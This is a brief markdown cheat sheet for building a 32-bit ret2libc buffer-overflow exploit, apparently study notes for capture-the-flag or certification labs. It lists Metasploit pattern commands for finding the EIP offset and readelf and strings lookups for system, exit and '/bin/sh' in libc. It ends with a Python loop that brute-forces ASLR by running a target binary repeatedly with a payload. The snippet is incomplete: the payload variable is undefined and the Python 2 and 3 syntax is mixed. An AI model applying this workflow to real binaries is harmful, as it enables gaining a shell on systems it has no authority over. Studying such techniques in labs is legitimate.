# Python buffer overflow template - rop - return libc


## Find EIP overwrite offset


### Create a crafted payload
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
```

### Look for segmentation fault address

```bash
Program received signal SIGSEGV, Segmentation fault.
0x62413762 in ?? ()
```

### Get offset 

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
[*] Exact match at offset 52
```

## Find offsets


### libc static pointer
```bash
ldd <binary> |grep libc
```

### system function
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 |grep system
```

### exit function
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 |grep exit
```

### find pointer to /bin/sh
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 |grep /bin/sh
```

# ASLR bruteforce (optional)

**Is ASLR enabled? Run ASLR Bruteforce**

```python
i = 0
while (i < 512):
 i += 1
 print("Try {0}".format(i))
 ret = subprocess.call(["/home/user/<binary>",buf])
 print ret
```